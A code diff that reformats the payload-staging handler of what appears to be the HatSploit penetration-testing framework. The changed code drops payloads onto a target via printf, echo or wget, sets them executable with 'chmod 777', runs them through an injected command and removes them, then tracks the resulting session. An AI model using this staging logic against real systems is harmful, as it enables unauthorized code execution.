@@ -87,7 +87,8 @@ class Handler(Server):
             byte_octals.append(byte_octal)
         return ''.join(byte_octals)
 
-    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp'):
+    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+                   location='/tmp'):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -110,7 +111,8 @@ class Handler(Server):
         sender(*args, {command})
         requests.delete(wget_container)
 
-    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp'):
+    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+                   location='/tmp'):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -134,7 +136,8 @@ class Handler(Server):
 
         sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")
     
-    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp'):
+    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';',
+                     location='/tmp'):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -165,7 +168,8 @@ class Handler(Server):
         session.details['Platform'] = payload['Platform']
         return session
 
-    def handle_session(self, host, port, payload, sender=None, args=[], delim=';', location='/tmp', timeout=10, method=None, post="printf"):
+    def handle_session(self, host, port, payload, sender=None, args=[],
+                       delim=';', location='/tmp', timeout=10, method=None, post="printf"):
         if payload['Payload'] is None:
             self.badges.output_error("Payload stage is not found!")
             return False
@@ -174,16 +178,59 @@ class Handler(Server):
             session = payload['Session'] if payload['Session'] is not None else HatSploitSession
             if payload['Category'].lower() == 'stager':
                 if post.lower() == 'printf':
-                    threading.Thread(target=self.printf_stage, args=[payload['Payload'], sender, args, payload['Args'], delim, location]).start()
+                    threading.Thread(
+                        target=self.printf_stage,
+                        args=[
+                            payload['Payload'],
+                            sender,
+                            args,
+                            payload['Args'],
+                            delim,
+                            location
+                        ]
+                    ).start()
                 elif post.lower() == 'echo':
-                    threading.Thread(target=self.echo_stage, args=[payload['Payload'], sender, args, payload['Args'], delim, location]).start()
+                    threading.Thread(
+                        target=self.echo_stage,
+                        args=[
+                            payload['Payload'],
+                            sender,
+                            args,
+                            payload['Args'],
+                            delim,
+                            location
+                        ]
+                    ).start()
                 elif post.lower() == 'wget':
-                    threading.Thread(target=self.wget_stage, args=[payload['Payload'], sender, args, payload['Args'], delim, location]).start()
+                    threading.Thread(
+                        target=self.wget_stage,
+                        args=[
+                            payload['Payload'],
+                            sender,
+                            args,
+                            payload['Args'],
+                            delim,
+                            location
+                        ]
+                    ).start()
                 else:
                     self.output_warning("Invalid post method, using printf by default.")
-                    threading.Thread(target=self.printf_stage, args=[payload['Payload'], sender, args, payload['Args'], delim, location]).start()
+                    threading.Thread(
+                        target=self.printf_stage,
+                        args=[
+                            payload['Payload'],
+                            sender,
+                            args,
+                            payload['Args'],
+                            delim,
+                            location
+                        ]
+                    ).start()
             elif payload['Category'].lower() == 'single':
-                threading.Thread(target=sender, args=[*args, payload['Payload']]).start()
+                threading.Thread(
+                    target=sender,
+                    args=[*args, payload['Payload']]
+                ).start()
             else:
                 self.badges.output_error("Invalid payload category!")
                 return False
@@ -203,16 +250,59 @@ class Handler(Server):
 
                 if payload['Category'].lower() == 'stager':
                     if post.lower() == 'printf':
-                        threading.Thread(target=self.printf_stage, args=[payload['Payload'], new_session.send_command, args, payload['Args'], delim, location]).start()
+                        threading.Thread(
+                            target=self.printf_stage,
+                            args=[
+                                payload['Payload'],
+                                new_session.send_command,
+                                args,
+                                payload['Args'],
+                                delim,
+                                location
+                            ]
+                        ).start()
                     elif post.lower() == 'echo':
-                        threading.Thread(target=self.echo_stage, args=[payload['Payload'], new_session.send_command, args, payload['Args'], delim, location]).start()
+                        threading.Thread(
+                            target=self.echo_stage,
+                            args=[
+                                payload['Payload'],
+                                new_session.send_command,
+                                args,
+                                payload['Args'],
+                                delim,
+                                location
+                            ]
+                        ).start()
                     elif post.lower() == 'wget':
-                        threading.Thread(target=self.wget_stage, args=[payload['Payload'], new_session.send_command, args, payload['Args'], delim, location]).start()
+                        threading.Thread(
+                            target=self.wget_stage,
+                            args=[
+                                payload['Payload'],
+                                new_session.send_command,
+                                args,
+                                payload['Args'],
+                                delim,
+                                location
+                            ]
+                        ).start()
                     else:
                         self.output_warning("Invalid post method, using printf by default.")
-                        threading.Thread(target=self.printf_stage, args=[payload['Payload'], new_session.send_command, args, payload['Args'], delim, location]).start()
+                        threading.Thread(
+                            target=self.printf_stage,
+                            args=[
+                                payload['Payload'],
+                                new_session.send_command,
+                                args,
+                                payload['Args'],
+                                delim,
+                                location
+                            ]
+                        ).start()
                 elif payload['Category'].lower() == 'single':
-                    threading.Thread(target=new_session.send_command, args=[payload['Payload']]).start()
+                    threading.Thread(
+                        target=new_session.send_command,
+                        args=[payload['Payload']]
+                    ).start()
                 else:
                     self.badges.output_error("Invalid payload category!")
                     return False
